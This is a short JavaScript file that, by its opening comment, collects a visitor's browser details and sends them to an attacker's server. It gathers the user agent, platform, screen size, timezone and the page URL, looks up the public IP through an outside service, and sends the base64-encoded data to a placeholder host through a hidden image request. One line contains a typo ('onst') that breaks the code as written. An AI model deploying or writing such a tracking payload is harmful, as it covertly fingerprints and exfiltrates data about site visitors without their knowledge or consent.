// Collect information about the user's browser and send it to VPS

function getSystemInfo() {
    const systemInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: {
            width: window.screen.width,
            height: window.screen.height
        },
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        online: navigator.onLine
    };
    return systemInfo;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return null;
    }
}
async function sendInfo(data) {
    onst url = "http://your_ip_or_domain_here/data="
    const img = new Image();
    const d = btoa(JSON.stringify(data))
    img.src = url + d
    document.body.append(img);
}

async function collectAllInfo() {
    try {
        const systemInfo = getSystemInfo();
        const ipAddress = await getIPAddress();
        const url = window.location.href

        const allInfo = {
            system: systemInfo,
            ipAddress: ipAddress,
            url: url
        };
        console.log('Collected Information:', allInfo);
      sendInfo(allInfo);
    } catch (error) {
        console.error('Error collecting information:', error);
        return null;
    }
}
